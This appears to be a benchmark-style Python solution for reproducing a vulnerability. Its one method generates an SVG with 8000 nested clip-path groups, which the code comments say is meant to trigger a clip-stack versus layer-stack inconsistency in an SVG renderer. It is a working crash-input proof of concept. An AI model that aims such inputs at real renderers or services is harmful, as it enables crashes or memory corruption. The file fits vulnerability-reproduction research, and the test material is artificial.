import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Generate a deeply nested SVG with numerous clip-path pushes and minimal layer pushes
        # to trigger the clip stack vs layer stack inconsistency.
        depth = 8000
        clip_count = 256

        parts = []
        parts.append('<?xml version="1.0" encoding="UTF-8"?>')
        parts.append('<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100">')
        parts.append('<defs>')
        # Create a set of different clip paths to avoid trivial deduplication optimizations
        # Distribute small rectangles across the canvas
        cols = 16
        cell = 6
        w = 5
        h = 5
        for i in range(clip_count):
            x = (i % cols) * cell
            y = (i // cols) * cell
            parts.append(f'<clipPath id="c{i}"><rect x="{x}" y="{y}" width="{w}" height="{h}"/></clipPath>')
        parts.append('</defs>')

        # Deeply nested groups each applying a clip-path reference
        for i in range(depth):
            idx = i % clip_count
            parts.append(f'<g clip-path="url(#c{idx})">')

        # Minimal paint operation to ensure clip is processed
        parts.append('<rect x="0" y="0" width="100" height="100" fill="black"/>')

        # Close all nested groups
        parts.extend(['</g>'] * depth)
        parts.append('</svg>')

        return '\n'.join(parts).encode('utf-8')